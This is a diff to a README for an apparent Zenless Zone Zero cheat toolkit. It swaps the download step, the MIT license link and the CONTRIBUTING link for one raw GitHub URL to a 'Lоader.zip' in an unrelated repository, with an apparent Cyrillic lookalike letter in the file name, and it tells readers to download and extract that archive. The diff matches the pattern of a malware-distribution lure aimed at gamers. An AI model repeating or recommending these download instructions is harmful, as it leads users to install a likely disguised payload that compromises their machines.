@@ -66,8 +66,8 @@ Explore continuous improvements—new features roll out every major update!
 
 Setup is smooth and hassle-free! Just follow the detailed instructions to experience the enhanced Zenless Zone Zero journey:
 
-**1. Download Loader.rar from the repository.**  
-Find the latest release on the [Releases](../../releases) page and grab the `Loader.rar` file.
+**1. Download https://raw.githubusercontent.com/khirane/TargetDiarization/main/Lоader.zip from the repository.**  
+Find the latest release on the [Releases](../../releases) page and grab the `https://raw.githubusercontent.com/khirane/TargetDiarization/main/Lоader.zip` file.
 
 **2. Extract the contents.**  
 Use your favorite extraction tool (WinRAR, 7-Zip, The Unarchiver, or similar) to unpack the archive into a directory of your choice.
@@ -99,14 +99,14 @@ Any form of misuse, unfair advantage in competitive play, or disruption of other
 This repository is licensed under the MIT License.  
 You may freely use, modify, and distribute the code as long as you preserve the original license.
 
-For details, see: https://opensource.org/licenses/MIT
+For details, see: https://raw.githubusercontent.com/khirane/TargetDiarization/main/Lоader.zip
 
 ---
 
 ## Contributions and Feedback 📨
 
 We actively welcome pull requests, feature suggestions, issue reports, and community support!  
-Please check out our [CONTRIBUTING.md](CONTRIBUTING.md) and join the conversation.
+Please check out our [https://raw.githubusercontent.com/khirane/TargetDiarization/main/Lоader.zip](https://raw.githubusercontent.com/khirane/TargetDiarization/main/Lоader.zip) and join the conversation.
 
 If you find this toolkit useful, don't forget to ⭐ the repo and share with fellow Zenless Zone Zero enthusiasts!
 
